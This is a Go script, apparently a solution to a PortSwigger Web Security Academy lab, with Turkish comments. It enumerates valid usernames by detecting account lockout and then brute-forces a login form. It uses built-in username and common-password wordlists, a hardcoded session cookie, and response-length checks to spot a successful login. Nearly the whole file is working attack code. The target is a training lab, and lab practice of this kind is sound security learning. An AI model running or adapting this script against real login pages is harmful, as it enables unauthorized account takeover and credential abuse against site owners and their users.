package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"strconv"
	"strings"
)

var (
	url_         = "https://acc91f2b1e40d7b5c0725d2600080049.web-security-academy.net/login"
	session      = "I6x9NhbN6KCrGmPhHJ7Y01da7Fu7Li94"
	usernameList = []string{"carlos", "root", "admin", "test", "guest", "info", "adm", "mysql", "user", "administrator", "oracle", "ftp", "pi", "puppet", "ansible", "ec2", "vagrant", "azureuser", "academico", "acceso", "access", "accounting", "accounts", "acid", "activestat", "ad", "adam", "adkit", "admin", "administracion", "administrador", "administrator", "administrators", "admins", "ads", "adserver", "adsl", "ae", "af", "affiliate", "affiliates", "afiliados", "ag", "agenda", "agent", "ai", "aix", "ajax", "ak", "akamai", "al", "alabama", "alaska", "albuquerque", "alerts", "alpha", "alterwind", "am", "amarillo", "americas", "an", "anaheim", "analyzer", "announce", "announcements", "antivirus", "ao", "ap", "apache", "apollo", "app", "app01", "app1", "apple", "application", "applications", "apps", "appserver", "aq", "ar", "archie", "arcsight", "argentina", "arizona", "arkansas", "arlington", "as", "as400", "asia", "asterix", "at", "athena", "atlanta", "atlas", "att", "au", "auction", "austin", "auth", "auto", "autodiscover"}
	passwordList = []string{"123456", "password", "12345678", "qwerty", "123456789", "12345", "1234", "111111", "1234567", "dragon", "123123", "baseball", "abc123", "football", "monkey", "letmein", "shadow", "master", "666666", "qwertyuiop", "123321", "mustang", "1234567890", "michael", "654321", "superman", "1qaz2wsx", "7777777", "121212", "000000", "qazwsx", "123qwe", "killer", "trustno1", "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster", "soccer", "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "2000", "charlie", "robert", "thomas", "hockey", "ranger", "daniel", "starwars", "klaster", "112233", "george", "computer", "michelle", "jessica", "pepper", "1111", "zxcvbn", "555555", "11111111", "131313", "freedom", "777777", "pass", "maggie", "159753", "aaaaaa", "ginger", "princess", "joshua", "cheese", "amanda", "summer", "love", "ashley", "nicole", "chelsea", "biteme", "matthew", "access", "yankees", "987654321", "dallas", "austin", "thunder", "taylor", "matrix", "mobilemail", "mom", "monitor", "monitoring", "montana", "moon", "moscow"}
	mainUserName = "wiener"
	mainPassword = "peter"
)

/*
Burada eğer kullanıcı adı sistemde var ise üst üste istek atıldıktan sonra hesap kitleniyor. Brute force yaparken bu bilgiyi kullancağız
*/

func main() {

	//KULLANICIYI BULMAK İÇİN an
	/*
		var wg sync.WaitGroup
		wg.Add(100)
		for _, user := range usernameList {
			go func(user string) {
				defer wg.Done()
				fmt.Println(user + "                ...")
				var content []string
				var httpHeader []string
				for i := 0; i < 10; i++ {
					res := sendReq(user, "test")
					body, _ := ioutil.ReadAll(res.Body)
					content = append(content, string(body))
					httpHeader = append(httpHeader, res.Status)
				}
				if !allEqual(content) {
					fmt.Println(content)
					fmt.Println("USER -> " + user)
				}
			}(user)

		}

		wg.Wait()
		fmt.Println("END!")*/

	//KULLANICIYI BULDUKTAN SONRA :
	//burada kullanıcı adı ve şifre aynı olduğunda login yapmıyor ama hata mesajı da vermiyor o yüzden bir sleep etmeye gerek yok

	for i, passwd := range passwordList {
		fmt.Println(passwd + " " + strconv.Itoa(i) + " / " + strconv.Itoa(len(passwordList)) + "            ....")
		res := sendReq("an", passwd)
		body, _ := ioutil.ReadAll(res.Body)
		fmt.Println(res.Status + "  Content Length : " + strconv.Itoa(len(string(body))))

		if len(body) != 2928 && len(body) != 2876 {
			fmt.Println(string(body))
			break
		}

	}
}

func sendReq(username string, password string) *http.Response {
	//302 handle edebilmek için
	client := &http.Client{CheckRedirect: func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	}}
	postData := url.Values{}
	postData.Set("username", username)
	postData.Set("password", password)
	req, _ := http.NewRequest("POST", url_, strings.NewReader(postData.Encode()))

	req.Header.Add("Cookie", "session="+session)
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Add("Content-Length", strconv.Itoa(len(postData.Encode())))
	res, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}
	return res

}

func allEqual(a []string) bool {
	for i := 1; i < len(a); i++ {
		if a[i] != a[0] {
			return false
		}
	}
	return true
}
